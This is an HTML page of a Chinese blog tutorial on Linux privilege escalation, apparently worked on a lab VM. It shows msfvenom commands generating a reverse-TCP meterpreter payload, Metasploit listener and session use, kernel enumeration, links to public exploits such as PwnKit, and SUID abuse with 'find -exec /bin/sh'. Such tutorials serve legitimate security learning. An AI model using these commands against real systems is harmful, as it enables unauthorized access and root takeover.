@@ -1,0 +1,736 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/%E6%A5%BD.png">
+  <link rel="icon" href="/img/%E6%A5%BD.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="神楽">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前情提要Linux： getuid 系统用户：UID(0-999) 普通用户：UID(1000-*) root用户：UID为0，拥有系统的完全控制权限 1234┌──(root㉿kali)-[~]└─# id      用户id&#x3D;0(root) 组id&#x3D;0(root) 组&#x3D;0(root),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(aud">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux提权（一）">
+<meta property="og:url" content="https://helloworldbugs.gitlab.io/2024/06/26/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/Linux%E6%8F%90%E6%9D%83%EF%BC%88%E4%B8%80%EF%BC%89/index.html">
+<meta property="og:site_name" content="神楽的博客">
+<meta property="og:description" content="前情提要Linux： getuid 系统用户：UID(0-999) 普通用户：UID(1000-*) root用户：UID为0，拥有系统的完全控制权限 1234┌──(root㉿kali)-[~]└─# id      用户id&#x3D;0(root) 组id&#x3D;0(root) 组&#x3D;0(root),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(aud">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-06-26T02:57:15.000Z">
+<meta property="article:modified_time" content="2024-11-14T09:02:44.897Z">
+<meta property="article:author" content="神楽">
+<meta property="article:tag" content="提权">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>Linux提权（一） - 神楽的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"helloworldbugs.gitlab.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":50,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>神楽的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/guidao.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Linux提权（一）"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-06-26 10:57" pubdate>
+          2024年6月26日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          37 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Linux提权（一）</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2024年11月14日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a><strong>前情提要</strong></h2><p>Linux：</p>
+<p>getuid</p>
+<p>系统用户：UID(0-999)</p>
+<p>普通用户：UID(1000-*)</p>
+<p>root用户：UID为0，拥有系统的完全控制权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">┌──(root㉿kali)-[~]<br>└─# id      <br>用户id=0(root) 组id=0(root) 组=0(root),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(wireshark),121(bluetooth),133(scanner),141(kaboxer)<br> <br></code></pre></td></tr></table></figure>
+
+<h2 id="MSF-Linux上线"><a href="#MSF-Linux上线" class="headerlink" title="MSF Linux上线"></a><strong>MSF Linux上线</strong></h2><h3 id="show-options-看需要配置什么"><a href="#show-options-看需要配置什么" class="headerlink" title="show options  (看需要配置什么)"></a><strong>show options  (看需要配置什么)</strong></h3><p>有初学的师傅上线Linux生成马子就干，不急先使用show options命令看有没有需要配置的东西</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">监听器的设置<br>msf6 exploit(multi/handler) &gt; show options<br><br>Module options (exploit/multi/handler):<br><br>  Name Current Setting Required Description<br>  ---- --------------- -------- -----------<br><br><br>Payload options (php/meterpreter/reverse_tcp):<br><br>  Name   Current Setting Required Description<br>  ----   --------------- -------- -----------<br>  LHOST 填写自己攻击机的IP yes       The listen address (an interface may be specified)<br>  LPORT 8888             yes       The listen port<br><br><br>Exploit target:<br><br>  Id Name<br>  -- ----<br>  0   Wildcard Target<br> <br> <br>msf6 exploit(multi/handler) &gt;set LHOST 填写自己攻击机的IP<br></code></pre></td></tr></table></figure>
+
+<h3 id="哥斯拉PMeterpreter模块转MSF的坑"><a href="#哥斯拉PMeterpreter模块转MSF的坑" class="headerlink" title="哥斯拉PMeterpreter模块转MSF的坑"></a><strong>哥斯拉PMeterpreter模块转MSF的坑</strong></h3><p>哥斯拉和自己生成的马子不一样，注意设置payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">自己生成马子上线<br><br>msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=8888 -f elf &gt; mshell.elf<br><br>监听器payload设置<br>msf6 exploit(multi/handler) &gt;set payload linux/x64/meterpreter/reverse_tcp<br><br>哥斯拉转发上线<br>监听器payload<br>msf6 exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp<br><br>###一个是马子上线，一个是shell上线不一样，建议还是直接哥斯拉上线，上传马子太敏感了<br><br><br>报错<br>msf6 exploit(multi/handler) &gt; run<br><br>[*] Started reverse TCP handler on 192.168.1.11:8888<br>[*] Sending stage (3020772 bytes) to 192.168.1.5<br>[-] Meterpreter session 1 is not valid and will be closed<br>[*] - Meterpreter session 1 closed.<br><br>###这就是payload设置没对session断掉了<br> <br></code></pre></td></tr></table></figure>
+
+<h3 id="MSF经常使用技巧"><a href="#MSF经常使用技巧" class="headerlink" title="MSF经常使用技巧"></a><strong>MSF经常使用技巧</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">background     ###返回上一级，经常用到<br>show options   ###使用模块攻击前先配置好，别又报错了<br>exit   ###退出不建议用还是用上面的background好<br><br>sessions   ###查看当前连接的session如下<br>msf6 exploit(multi/handler) &gt; sessions<br><br>search 漏洞名称     ###查找msf的漏洞脚本<br><br>Active sessions<br>===============<br><br>Id Name Type                   Information         Connection<br>-- ---- ----                   -----------         ----------<br>4         meterpreter php/linux www-data @ darkhole 192.168.1.11:8888 -&gt; 192.168.1.5:51266 (192.168.1.5)<br><br><br>sessions -i 4   ###指定进入session<br>msf6 exploit(multi/handler) &gt; sessions -i 4<br>[*] Starting interaction with 4...<br><br> <br></code></pre></td></tr></table></figure>
+
+<h3 id="MSF生成马子的坑"><a href="#MSF生成马子的坑" class="headerlink" title="MSF生成马子的坑"></a><strong>MSF生成马子的坑</strong></h3><p>问题根源：msf版本不同导致语法不同</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">msf5版本生成马子的命令<br>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=8888 -f elf &gt; mshell.elf<br><br><br>msf6版本生成马子的命令<br>msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=8888 -f elf &gt; mshell.elf<br><br>###小坑一个我先给踩了<br></code></pre></td></tr></table></figure>
+
+<h2 id="内核溢出提权（比较主流的提权）"><a href="#内核溢出提权（比较主流的提权）" class="headerlink" title="内核溢出提权（比较主流的提权）"></a><strong>内核溢出提权（比较主流的提权）</strong></h2><h3 id="流程："><a href="#流程：" class="headerlink" title="流程："></a><strong>流程：</strong></h3><p>信息收集系统内核等信息——&gt;筛选适用的脚本——&gt;提权</p>
+<p>不建议使用msf自动的那个模块，不是很好用</p>
+<p>1、信息收集</p>
+<p>当前主机的操作系统</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">hostnamectl<br>cat /etc/*-release<br>lsb_release -a<br>cat /etc/lsb-release # Debain<br>cat /etc/redhat-release # Redhat<br>cat /etc/centos-release # Centos<br>cat /etc/os-release # Ubuntu<br>cat /etc/issue<br></code></pre></td></tr></table></figure>
+
+<p>实例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">hostnamectl<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">hostnamectl   ###这个就够用别一个一个测<br>  Static hostname: darkhole<br>        Icon name: computer-vm<br>          Chassis: vm<br>      Machine ID: 0d436af297774adfa085d28ed92d4210<br>          Boot ID: 598921d4c2d646f4a89ee08cd97c986e<br>  Virtualization: vmware<br>Operating System: Ubuntu 20.04.2 LTS<br>          Kernel: Linux 5.4.0-182-generic<br>    Architecture: x86-64<br> <br></code></pre></td></tr></table></figure>
+
+<p>当前主机的内核版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">hostnamectl<br>uname -a     ###用这一条差不多了<br>uname -r<br>cat /proc/version<br>dmesg | grep &quot;Linux version&quot;<br></code></pre></td></tr></table></figure>
+
+<p>实例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">uname -a<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">uname -a<br>Linux darkhole 5.4.0-182-generic #202-Ubuntu SMP Fri Apr 26 12:29:36 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux<br></code></pre></td></tr></table></figure>
+
+<p>2、内核漏洞筛选：</p>
+<p>MSF检测：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">msf6 exploit(multi/handler) &gt; use post/multi/recon/local_exploit_suggester<br>msf6 post(multi/recon/local_exploit_suggester) &gt; show options<br><br>Module options (post/multi/recon/local_exploit_suggester):<br><br>  Name             Current Setting Required Description<br>  ----             --------------- -------- -----------<br>  SESSION                           yes       The session to run this module on<br>  SHOWDESCRIPTION false           yes       Displays a detailed description for the available exploits<br><br>msf6 post(multi/recon/local_exploit_suggester) &gt; set session 4<br>session =&gt; 4<br>msf6 post(multi/recon/local_exploit_suggester) &gt; run<br><br>[*] 192.168.1.5 - Collecting local exploits for php/linux...<br>[-] 192.168.1.5 - No suggestions available.<br>[*] Post module execution completed<br><br><br>###公开版检测没有，实在是垃圾建议使用其他脚本工具，或者使用msfpro版本那个挺厉害的<br></code></pre></td></tr></table></figure>
+
+<p>提权脚本:</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/liamg/traitor">https://github.com/liamg/traitor</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/The-Z-Labs/linux-exploit-suggester">https://github.com/The-Z-Labs/linux-exploit-suggester</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/jondonas/linux-exploit-suggester-2">https://github.com/jondonas/linux-exploit-suggester-2</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/belane/linux-soft-exploit-suggester">https://github.com/belane/linux-soft-exploit-suggester</a></p>
+<p>综合脚本:</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/redcode-labs/Bashark">https://github.com/redcode-labs/Bashark</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p>
+<h2 id="提权脚本（都大差不差就写一个了）"><a href="#提权脚本（都大差不差就写一个了）" class="headerlink" title="提权脚本（都大差不差就写一个了）"></a><strong>提权脚本（都大差不差就写一个了）</strong></h2><h3 id="linux-exploit-suggester项目"><a href="#linux-exploit-suggester项目" class="headerlink" title="linux-exploit-suggester项目"></a><strong>linux-exploit-suggester项目</strong></h3><h4 id="工具的介绍"><a href="#工具的介绍" class="headerlink" title="工具的介绍"></a><strong>工具的介绍</strong></h4><p>Linux_Exploit_Suggester是一款根据Linux操作系统版本号自动查找相应提权脚本的工具，旨在帮助检测给定 Linux 内核&#x2F;基于 Linux 的机器的安全缺陷。</p>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p>
+<p>Highly probable：评估的内核很可能受到影响，并且 PoC 漏洞利用很有可能不用在任何重大修改的情况下开箱即用Probable：漏洞利用可能会起作用，但很可能需要定制 PoC 漏洞利用以适合目标使用Less probable：需要额外的手动分析来验证内核是否受到影响Unprobable：内核极不可能受到影响（漏洞利用不会显示在工具的输出中）</p>
+<h4 id="工具的使用"><a href="#工具的使用" class="headerlink" title="工具的使用"></a><strong>工具的使用</strong></h4><p>1 上传脚本然后直接运行     ###注意给脚本权限   chmod +x 1.sh</p>
+<p>2 优先看有Tags字段的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs text-plain"><br>[+] [CVE-2022-2586] nft_object UAF<br><br>  Details: https://www.openwall.com/lists/oss-security/2022/08/29/5<br>  Exposure: probable<br>  Tags: [ ubuntu=(20.04) ]&#123;kernel:5.12.13&#125;<br>  Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1<br>  Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)<br><br>[+] [CVE-2021-4034] PwnKit<br><br>  Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt<br>  Exposure: probable<br>  Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro<br>  Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main<br><br>[+] [CVE-2021-3156] sudo Baron Samedit<br><br>  Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt<br>  Exposure: probable<br>  Tags: mint=19,[ ubuntu=18|20 ], debian=10<br>  Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main<br><br><br>### 截取了部分响应，具体怎么操作建议自行实验<br> <br></code></pre></td></tr></table></figure>
+
+<p>3 选择脚本直接提权</p>
+<p>不一定使用他提供的脚本地址</p>
+<p>例如<br>Download URL: <a target="_blank" rel="noopener" href="https://codeload.github.com/berdav/CVE-2021-4034/zip/main">https://codeload.github.com/berdav/CVE-2021-4034/zip/main</a>  </p>
+<p>反正我没成功<br>推荐一个脚本POC集成项目，根据漏洞编号找  </p>
+<p><a target="_blank" rel="noopener" href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a><br><a target="_blank" rel="noopener" href="https://github.com/nomi-sec/PoC-in-GitHub/tree/master">https://github.com/nomi-sec/PoC-in-GitHub/tree/master</a></p>
+<h2 id="SUID提权（普通用户权限使用）"><a href="#SUID提权（普通用户权限使用）" class="headerlink" title="SUID提权（普通用户权限使用）"></a><strong>SUID提权（普通用户权限使用）</strong></h2><h3 id="前情提要-1"><a href="#前情提要-1" class="headerlink" title="前情提要"></a><strong>前情提要</strong></h3><p>众所周知，在 Linux 中一切都是一个文件，而文件的权限有rwx（即读&#x2F;写&#x2F;执行），所有者、所有组、其它用户的rwx权限是彼此独立的。</p>
+<p>文件所有者和超级用户可以修改文件或目录的权限。可以使用绝对模式（八进制数字模式），符号模式指定文件的权限（chmod 754）。</p>
+<p>其实在Linux的权限设置中还存在着除rwx，的第四类权限位，即；</p>
+<p>SUID(Set UID)：</p>
+<p>suid权限仅对二进制程序有效（binary program）；执行者对于该程序需要具有x的可执行权限；本权限仅在执行该程序的过程中有效（run-time）；执行者将具有该程序拥有者的权限。</p>
+<p>SGID(Set SGID)：</p>
+<p>SGID对二进制文件有用；程序执行者对该程序来说，具有x权限；执行者在执行的过程中将获得该程序群组的权限；</p>
+<p>Sticky Bit</p>
+<p>SBIT只针对目录有效；除非目录的属主和root用户有权限删除它，除此之外其它用户不能删除和修改这个目录；</p>
+<h3 id="使用PEASS-ng工具探测"><a href="#使用PEASS-ng工具探测" class="headerlink" title="使用PEASS-ng工具探测"></a><strong>使用PEASS-ng工具探测</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">###在你执行了以后不光可以直接用脚本来进行sudo提权<br><br>执行以后会有这样一个模块Files with Interesting Permissions<br><br>例子（截取部分代码）<br>══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                                                    <br>╔══════════╣ SUID - Check easy privesc, exploits and write perms<br>╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid            <br>strace Not Found                                                                            <br>-rwsr-xr-x 1 root root 87K Dec 10 2012 /bin/mount ---&gt; Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                                                                                                            <br>-rwsr-xr-x 1 root root 31K Apr 13 2011 /bin/ping<br>-rwsr-xr-x 1 root root 35K Feb 27 2017 /bin/su<br>-rwsr-xr-x 1 root root 35K Apr 13 2011 /bin/ping6<br>-rwsr-xr-x 1 root root 67K Dec 10 2012 /bin/umount ---&gt; BSD/Linux(08-1996)<br>-rwsr-sr-x 1 daemon daemon 50K Oct 4 2014 /usr/bin/at ---&gt; RTru64_UNIX_4.0g(CVE-2002-1614)<br>-rwsr-xr-x 1 root root 36K Feb 27 2017 /usr/bin/chsh<br>-rwsr-xr-x 1 root root 45K Feb 27 2017 /usr/bin/passwd ---&gt; Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                              <br>-rwsr-xr-x 1 root root 31K Feb 27 2017 /usr/bin/newgrp ---&gt; HP-UX_10.20<br>-rwsr-xr-x 1 root root 44K Feb 27 2017 /usr/bin/chfn ---&gt; SuSE_9.3/10<br>-rwsr-xr-x 1 root root 65K Feb 27 2017 /usr/bin/gpasswd<br>-rwsr-sr-x 1 root mail 82K Nov 18 2017 /usr/bin/procmail<br>-rwsr-xr-x 1 root root 159K Jan 6 2012 /usr/bin/find<br><br><br>###<br>我们看什么呢？<br>###<br>就看标红的文件或者命令<br>sudo的原理简单来说，就是其他用户调用一些命令的时候不会因为权限问题受限，root可以调用，web用户也可以调用<br>我用到的就是find命令来进行sudo提权<br>###<br>为什么用find？<br>###<br>因为find可以调用-exec来执行命令<br>####<br>使用“-exec”提权,也就是find+perms+exec 命令来提权。这里有两种方法可以用<br><br>1. find ./ acce -exec &#x27;/bin/sh&#x27; \;<br>2.<br>touch bcce<br>find bcce -exec &#x27;/bin/sh&#x27; \;<br></code></pre></td></tr></table></figure>
+
+<p>实际效果</p>
